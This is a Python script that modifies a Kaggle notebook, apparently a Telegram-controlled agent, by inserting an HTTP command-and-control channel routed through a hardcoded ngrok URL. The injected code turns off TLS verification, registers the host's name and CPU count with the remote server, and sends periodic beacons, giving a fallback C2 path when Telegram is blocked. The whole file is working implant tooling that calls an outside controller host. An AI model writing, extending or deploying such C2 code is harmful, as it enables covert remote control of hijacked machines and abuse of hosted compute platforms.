#!/usr/bin/env python3
"""Add HTTP C2 channel via ngrok to notebook."""

import json
from pathlib import Path

NGROK_URL = "https://lynelle-scroddled-corinne.ngrok-free.dev"

def add_http_c2():
    """Add HTTP C2 channel via ngrok to notebook."""
    nb_path = Path(__file__).parent.parent / "src" / "agents" / "kaggle" / "notebook-telegram.ipynb"
    
    with open(nb_path) as f:
        notebook = json.load(f)
    
    source = notebook["cells"][0]["source"]
    
    # Add HTTP C2 class and configuration
    http_c2_code = f'''
# ═══════════════════════════════════════════════════════════════════════════
# HTTP C2 CHANNEL (via ngrok - works when Telegram is blocked)
# ═══════════════════════════════════════════════════════════════════════════

class HTTPC2:
    """HTTP-based C2 via ngrok tunnel"""
    
    def __init__(self, server_url, agent_id):
        self.server_url = server_url.rstrip('/')
        self.agent_id = agent_id
    
    def send_message(self, text):
        """Send message via HTTP to C2 server"""
        import urllib.request
        import ssl
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        data = {{
            "agent_id": self.agent_id,
            "message": text,
            "timestamp": time.time()
        }}
        
        try:
            req = urllib.request.Request(
                f"{{self.server_url}}/api/agent/message",
                data=json.dumps(data).encode('utf-8'),
                headers={{'Content-Type': 'application/json'}}
            )
            resp = urllib.request.urlopen(req, timeout=30, context=ctx)
            return json.loads(resp.read().decode('utf-8'))
        except Exception as e:
            return {{"ok": False, "error": str(e)}}
    
    def register(self, hostname, cpu_count, platform="kaggle"):
        """Register agent with C2"""
        msg = f"""🔴 NEW AGENT REGISTERED
━━━━━━━━━━━━━━━━━━━━
🆔 ID: {{self.agent_id}}
🖥 Hostname: {{hostname}}
💻 Platform: {{platform}}
🔧 CPU Cores: {{cpu_count}}
⏰ Time: {{time.strftime('%Y-%m-%d %H:%M:%S')}}
━━━━━━━━━━━━━━━━━━━━
#register #{{platform}}"""
        
        result = self.send_message(msg)
        return result.get("ok", False)
    
    def beacon(self, status="active", extra_data=None):
        """Send beacon to C2"""
        msg = f"""🟢 BEACON: {{self.agent_id}}
Status: {{status}}
Time: {{time.strftime('%H:%M:%S')}}"""
        
        if extra_data:
            msg += f"\\nData: {{json.dumps(extra_data)}}"
        
        result = self.send_message(msg)
        return result.get("ok", False)

# Create HTTP C2 instance
http_c2 = HTTPC2("{NGROK_URL}", agent_id)

'''
    
    # Find where to insert (after agent creation, before registration)
    lines = source.split('\n')
    insert_idx = None
    
    for i, line in enumerate(lines):
        if 'agent = C2Agent(tg_c2)' in line:
            insert_idx = i
            break
    
    if insert_idx:
        new_lines = lines[:insert_idx] + [http_c2_code] + lines[insert_idx:]
        
        # Also modify agent creation to use both channels
        for i, line in enumerate(new_lines):
            if 'agent = C2Agent(tg_c2)' in line:
                # Replace with hybrid approach
                new_lines[i] = '''# Try Telegram first, fallback to HTTP
agent = C2Agent(tg_c2)
print('[C2] Telegram channel ready')

# Also register via HTTP
print('[C2] Registering via HTTP...')
http_c2.register(socket.gethostname(), os.cpu_count())
print('[C2] ✓ HTTP registration sent')'''
                break
        
        new_source = '\n'.join(new_lines)
        
        notebook["cells"][0]["source"] = new_source
        
        with open(nb_path, 'w') as f:
            json.dump(notebook, f, indent=2)
        
        print(f"✓ Added HTTP C2 channel via ngrok")
        print(f"  URL: {NGROK_URL}")
        print(f"  Source length: {len(new_source)} chars")
        return True
    
    print("✗ Could not find insertion point")
    return False

if __name__ == "__main__":
    add_http_c2()
